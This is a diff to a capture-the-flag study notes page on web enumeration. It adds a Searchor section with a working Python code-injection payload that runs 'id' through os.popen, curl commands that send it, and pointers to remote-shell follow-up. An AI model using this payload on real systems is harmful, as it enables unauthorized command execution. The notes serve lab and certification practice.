@@ -266,6 +266,28 @@ If the direct request works but Gobuster or Feroxbuster times out, reduce thread
 - [ ] Nmap shows the port open but direct requests fail consistently → **Check the Host header, local name resolution, route, and service banner before changing VPN configuration**
 - [ ] A known path responds but broad scans fail → **Treat the scanner failure as a tuning result and continue manually**
 
+## Searchor Python application branch
+
+When the page identifies Searchor or another Python search wrapper, save the source and test the input boundary with a harmless expression. A visible version string can be more valuable than broad wordlist output when it maps the application to a dependency or source package.
+
+```bash
+curl -fsS "http://$FQDN:$WebPort/" -o "$BoxDir/loot/searchor-index.html"
+grep -Ein 'searchor|version|engine|query|gitea|href|form' "$BoxDir/loot/searchor-index.html"
+boxset SearchorPayload "test'),__import__('os').popen('id').read()#"
+curl -fsS -G "http://$FQDN:$WebPort/" \
+  --data-urlencode "engine=Accuweather" \
+  --data-urlencode "query=$SearchorPayload" \
+  | tee "$BoxDir/loot/searchor-id-proof.txt"
+```
+
+The payload closes the application string, evaluates a Python expression that reads `id`, then comments out the remainder. Confirm the identity in the response before attempting a callback, and route to [[Linux - Command Injection]] and [[Linux - RCE to Shell]].
+
+## Additional routing
+
+- [ ] Searchor reflects `uid=` from the query expression → **Go to [[Linux - RCE to Shell]] and preserve the proof before callback delivery**
+- [ ] A hostname or alternate port appears in HTML or headers → **Add it to `/etc/hosts`, preserve the original response, and repeat this page with the correct Host header**
+- [ ] A version is disclosed but no public exploit matches → **Review the dependency behavior or source path manually; do not force a search result into an exploit**
+
 ## Shocker CGI branch
 
 When Gobuster or manual review identifies a CGI directory, enumerate the directory directly even when the directory itself returns 403. A direct script with a successful response is the decision point for [[Linux - Shellshock CGI]].
@@ -286,6 +308,7 @@ curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script"
 
 - [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]] -- direct CGI enumeration found user.sh even though the directory listing was forbidden
 - [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]] -- hostname-based SSO enumeration identified OpenAM and the password-reset validation route
+- [[OSCP/BOXES/WRITE UPS/Linux/Busqueda|Busqueda]] -- Searchor source behavior and query construction were reviewed before the reflected command-injection proof
 
 ## Related stages
 
